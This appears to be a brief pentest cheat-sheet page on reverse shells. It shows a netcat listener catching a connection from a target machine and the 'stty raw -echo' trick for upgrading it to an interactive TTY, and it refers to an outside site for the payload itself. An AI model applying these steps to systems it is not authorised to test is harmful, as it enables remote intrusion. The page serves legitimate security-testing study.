# Reverse Shell

First, you need to start a listener on your machine.
For example, using netcat:

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
```

Next, execute a reverse shell payload on the target machine you are testing.
You can generate a suitable payload using:

https://www.revshells.com/

Once the payload is executed successfully, you should receive a connection back to your listener.

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.81.161.175 37856
$ 
```

At this stage, the shell is usually very limited. To improve it and get a more stable interactive TTY, you can upgrade the shell using techniques described here:

https://0xffsec.com/handbook/shells/full-tty/

Example of upgrading the shell:

```
[ Oguri ~/Desktop ]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.81.161.175 37856
$ ^Z
[1]+  Stopped                    nc -lvnp 4444
[ Oguri ~/Desktop ]$ stty raw -echo && fg
nc -lvnp 4444
```

After this, the shell should behave more like a normal interactive Bash shell.
